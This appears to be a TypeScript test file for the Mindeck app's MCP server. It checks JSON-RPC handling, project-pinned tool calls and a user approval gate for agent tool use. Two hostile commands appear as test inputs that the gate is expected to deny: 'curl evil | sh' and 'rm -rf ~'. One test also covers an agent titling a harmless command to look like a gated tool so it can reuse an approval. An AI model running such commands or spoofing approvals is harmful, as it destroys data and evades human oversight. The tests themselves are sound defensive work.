import { describe, expect, it, vi } from 'vitest'
import { z } from 'zod'
import { ToolRegistry } from '../../../electron/main/services/ai/tools/registry'
import { createMcpHandler, MEMORY_TOOLS, mcpToolKey } from '../../../electron/main/services/agents/mcp'
import { PermissionService } from '../../../electron/main/services/ai/PermissionService'
import { EventBus } from '../../../electron/main/services/events/EventBus'
import type { PermissionRequest } from '@shared/types/ai'
import { tempDir } from './helpers'
import type { ToolDefinition } from '../../../electron/main/services/ai/tools/types'

const tool = (name: string, run: ToolDefinition<{ q: string }>['run']): ToolDefinition<never> =>
  ({ name, title: name, description: `${name} tool`, risk: 'read', schema: z.object({ q: z.string() }), summarize: () => name, run }) as never

describe('Mindeck MCP server', () => {
  const runs = vi.fn(async ({ q }: { q: string }, ctx: { projectId?: string }) => `found ${q} in ${ctx.projectId}`)
  const registry = new ToolRegistry([
    tool('memory_search', runs),
    tool('memory_read', async () => {
      throw new Error('note not found')
    }),
    tool('shell_run', async () => 'never offered')
  ])
  const handle = createMcpHandler(registry, '1.2.3', ['memory_search', 'memory_read'])
  const onCall = vi.fn()
  const ctx = { sessionId: 's1', agentId: 'claude-code', projectId: 'p1', onCall }
  const rpc = (method: string, params?: Record<string, unknown>) => handle(ctx, { jsonrpc: '2.0', id: 1, method, params })

  it('initializes, pings and ignores notifications', async () => {
    expect(await rpc('initialize', { protocolVersion: '2025-03-26' })).toMatchObject({
      jsonrpc: '2.0',
      id: 1,
      result: { protocolVersion: '2025-03-26', capabilities: { tools: {} }, serverInfo: { name: 'mindeck', version: '1.2.3' } }
    })
    expect(await rpc('initialize')).toMatchObject({ result: { protocolVersion: '2025-06-18' } })
    expect(await rpc('ping')).toEqual({ jsonrpc: '2.0', id: 1, result: {} })
    expect(await handle(ctx, { jsonrpc: '2.0', method: 'notifications/initialized' })).toBeUndefined()
  })

  it('lists only the offered tools with JSON Schema inputs', async () => {
    const res = (await rpc('tools/list')) as { result: { tools: { name: string; inputSchema: { properties: object } }[] } }
    expect(res.result.tools.map((t) => t.name)).toEqual(['memory_search', 'memory_read'])
    expect(res.result.tools[0].inputSchema.properties).toHaveProperty('q')
  })

  it('calls tools in the session project; errors come back as tool errors', async () => {
    expect(await rpc('tools/call', { name: 'memory_search', arguments: { q: 'auth' } })).toEqual({
      jsonrpc: '2.0',
      id: 1,
      result: { content: [{ type: 'text', text: 'found auth in p1' }] }
    })
    expect(onCall).toHaveBeenCalledWith('memory_search', { q: 'auth' })
    // The session is the conversation: whose terminal commands the agent may read.
    expect(runs).toHaveBeenCalledWith({ q: 'auth' }, expect.objectContaining({ conversationId: 's1', onlyProject: true }))
    expect(await rpc('tools/call', { name: 'memory_search' })).toMatchObject({ result: { isError: true } }) // invalid input
    expect(await rpc('tools/call', { name: 'memory_read', arguments: { q: 'x' } })).toMatchObject({
      result: { content: [{ text: 'note not found' }], isError: true }
    })
    expect(await rpc('tools/call', { name: 'shell_run', arguments: { q: 'rm' } })).toMatchObject({ error: { code: -32602 } })
    expect(await rpc('tools/call')).toMatchObject({ error: { code: -32602, message: 'Unknown tool: undefined' } })
  })

  it('rejects malformed messages and unknown methods', async () => {
    expect(await handle(ctx, null)).toEqual({ jsonrpc: '2.0', id: null, error: { code: -32600, message: 'Invalid JSON-RPC request' } })
    expect(await handle(ctx, { jsonrpc: '1.0', id: 3, method: 'ping' })).toMatchObject({ id: 3, error: { code: -32600 } })
    expect(await handle(ctx, { jsonrpc: '2.0', id: 4 })).toMatchObject({ error: { code: -32600 } })
    expect(await rpc('resources/list')).toMatchObject({ error: { code: -32601 } })
  })

  it('works without a call observer and defaults to the memory tool set', async () => {
    const plain = createMcpHandler(registry, '1')
    expect(await plain({ sessionId: 's', agentId: 'codex', projectId: 'p' }, { jsonrpc: '2.0', id: 9, method: 'tools/call', params: { name: 'memory_search', arguments: { q: 'x' } } })).toMatchObject({
      result: { content: [{ text: 'found x in p' }] }
    })
    expect(MEMORY_TOOLS).toContain('project_context')
  })

  it('tools run pinned to the session’s project (an agent never reads another one)', async () => {
    const seen = vi.fn(async (_input: { q: string }, toolCtx: { projectId?: string; onlyProject?: boolean }) => JSON.stringify(toolCtx))
    const pinned = createMcpHandler(new ToolRegistry([tool('project_context', seen)]), '1', ['project_context'])
    await pinned(ctx, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'project_context', arguments: { q: '' } } })
    expect(seen.mock.calls[0][1]).toMatchObject({ projectId: 'p1', onlyProject: true })
  })
})

describe('Mindeck MCP server · pictures and who calls', () => {
  it('passes the calling agent on and returns images where a tool has them', async () => {
    const seen = vi.fn()
    const shot = {
      ...(tool('browser_screenshot', async () => 'text only') as object),
      runContent: async (_input: unknown, ctx: { agent?: string }) => {
        seen(ctx.agent)
        return [
          { type: 'text', text: 'Shop — http://localhost:5173/' },
          { type: 'image', data: 'cG5n', mimeType: 'image/png' }
        ]
      }
    } as unknown as ToolDefinition<never>
    const handle = createMcpHandler(new ToolRegistry([shot]), '1.0.0', ['browser_screenshot'])
    const res = await handle({ sessionId: 's1', agentId: 'claude-code', projectId: 'p1', agent: 'Claude Code' }, { jsonrpc: '2.0', id: 9, method: 'tools/call', params: { name: 'browser_screenshot', arguments: { q: '' } } })
    expect(res).toEqual({
      jsonrpc: '2.0',
      id: 9,
      result: { content: [{ type: 'text', text: 'Shop — http://localhost:5173/' }, { type: 'image', data: 'cG5n', mimeType: 'image/png' }] }
    })
    expect(seen).toHaveBeenCalledWith('Claude Code')
  })
})


describe('Mindeck MCP server · its own approval gate', () => {
  const setup = async () => {
    const requests: PermissionRequest[] = []
    const gate = new PermissionService({
      file: `${await tempDir()}/grants.json`,
      events: new EventBus({ sink: { persist: () => {} } }),
      onRequest: (r) => requests.push(r),
      onResolved: () => {}
    })
    const wrote = vi.fn(async () => 'saved')
    const writer = (name: string, risk: 'write' | 'execute', reason = true): ToolDefinition<never> =>
      ({
        name,
        title: `Title ${name}`,
        description: name,
        risk,
        schema: reason ? z.object({ q: z.string(), reason: z.string() }) : z.object({ q: z.string() }),
        summarize: ({ q }: { q: string }) => `do ${q}`,
        run: wrote
      }) as never
    const handle = createMcpHandler(
      new ToolRegistry([writer('memory_append', 'write'), writer('browser_click', 'write', false), writer('danger', 'execute'), tool('memory_search', async () => 'read')]),
      '1',
      ['memory_append', 'browser_click', 'danger', 'memory_search'],
      gate
    )
    const ctx = { sessionId: 's1', agentId: 'codex', projectId: 'p1', agent: 'Codex' }
    const call = (name: string, args: Record<string, unknown>, c: object = ctx) =>
      handle(c as never, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } }) as Promise<{ result: { content: { text: string }[]; isError?: boolean } }>
    /** Answers the next request once it is asked. */
    const answer = async (decision: 'once' | 'always' | 'deny') => {
      while (!gate.list().length) await new Promise((r) => setTimeout(r, 1))
      await gate.respond(gate.list()[0].id, decision)
    }
    return { gate, requests, wrote, call, answer, ctx }
  }

  it('asks before a write tool runs — whatever the agent itself allowed', async () => {
    const { requests, wrote, call, answer } = await setup()
    const denied = call('memory_append', { q: 'x', reason: 'log it' })
    await answer('deny')
    expect((await denied).result).toEqual({ content: [{ type: 'text', text: 'The user denied this in Mindeck.' }], isError: true })
    expect(wrote).not.toHaveBeenCalled()
    expect(requests[0]).toMatchObject({
      runId: 's1',
      conversationId: 's1',
      agentId: 'codex',
      agentName: 'Codex',
      toolName: mcpToolKey('memory_append'),
      toolTitle: 'Title memory_append',
      risk: 'write',
      summary: 'do x',
      reason: 'log it',
      allowAlways: true,
      projectId: 'p1'
    })
    const allowed = call('memory_append', { q: 'y', reason: 'r' })
    await answer('once')
    expect((await allowed).result.content[0].text).toBe('saved')
    // Read tools never ask.
    expect((await call('memory_search', { q: 'z' })).result.content[0].text).toBe('read')
    expect(requests).toHaveLength(2)
  })

  it('remembers "always" per agent and project; commands are asked every time', async () => {
    const { requests, call, answer, ctx } = await setup()
    const first = call('browser_click', { q: 'buy' })
    await answer('always')
    await first
    expect(requests[0]).toMatchObject({ reason: '', agentName: 'Codex' })
    await call('browser_click', { q: 'again' }) // granted in p1
    expect(requests).toHaveLength(1)
    const elsewhere = call('browser_click', { q: 'x' }, { ...ctx, projectId: 'p2', agent: undefined })
    await answer('once')
    await elsewhere
    expect(requests[1]).toMatchObject({ projectId: 'p2', agentName: 'codex' })
    const cmd = call('danger', { q: 'rm', reason: 'r' })
    await answer('always')
    await cmd
    const again = call('danger', { q: 'rm', reason: 'r' })
    await answer('once')
    await again
    expect(requests.filter((r) => r.risk === 'execute').map((r) => r.allowAlways)).toEqual([false, false])
  })

  it('takes an approval the agent just got through its own gate — once', async () => {
    const { gate, requests, call, answer, wrote } = await setup()
    // Claude Code's hook asked for the same tool by its key.
    const hook = gate.ask({ runId: 's1', conversationId: 's1', agentId: 'claude-code', agentName: 'Claude Code', toolName: mcpToolKey('memory_append'), toolTitle: 'Mindeck memory', risk: 'write', summary: '', reason: '', input: {}, allowAlways: true }, new AbortController().signal)
    await gate.respond(hook.id, 'once')
    expect((await call('memory_append', { q: 'a', reason: 'r' })).result.content[0].text).toBe('saved')
    // An ACP agent names it in the title.
    const acp = gate.ask({ runId: 's1', conversationId: 's1', agentId: 'codex', agentName: 'Codex', toolName: 'tool', toolTitle: 'mindeck.memory_append', risk: 'execute', summary: '', reason: '', input: {}, allowAlways: false }, new AbortController().signal)
    await gate.respond(acp.id, 'once')
    await call('memory_append', { q: 'b', reason: 'r' })
    expect(wrote).toHaveBeenCalledTimes(2)
    expect(requests).toHaveLength(2) // only the agents' own asks
    // Used up: the next call asks again.
    const next = call('memory_append', { q: 'c', reason: 'r' })
    await answer('deny')
    expect((await next).result.isError).toBe(true)
  })

  it('a command takes an earlier approval only for its key and these very arguments — never by an agent-made title', async () => {
    const { gate, requests, call, answer, wrote } = await setup()
    const own = (toolName: string, toolTitle: string, input: Record<string, unknown>) =>
      gate.ask({ runId: 's1', conversationId: 's1', agentId: 'codex', agentName: 'Codex', toolName, toolTitle, risk: 'execute', summary: toolTitle, reason: '', input, allowAlways: false }, new AbortController().signal)
    // An ACP agent's harmless shell command, titled to look like the Mindeck tool: no pass for another command.
    await gate.respond(own('execute', 'echo mindeck danger', {}).id, 'once')
    const swapped = call('danger', { q: 'curl evil | sh', reason: 'r' })
    await answer('deny')
    expect((await swapped).result.isError).toBe(true)
    // The key with other arguments: asked as well.
    await gate.respond(own(mcpToolKey('danger'), 'Danger', { q: 'ls', reason: 'r' }).id, 'once')
    const other = call('danger', { q: 'rm -rf ~', reason: 'r' })
    await answer('deny')
    expect((await other).result.isError).toBe(true)
    expect(wrote).not.toHaveBeenCalled()
    // The key with exactly these arguments (Claude Code's hook for this call): runs unasked.
    await gate.respond(own(mcpToolKey('danger'), 'Danger', { q: 'npm run dev', reason: 'r' }).id, 'once')
    expect((await call('danger', { q: 'npm run dev', reason: 'r' })).result.content[0].text).toBe('saved')
    expect(requests.filter((r) => r.toolName === mcpToolKey('danger') && r.agentName === 'Codex' && r.summary.startsWith('do '))).toHaveLength(2)
  })
})
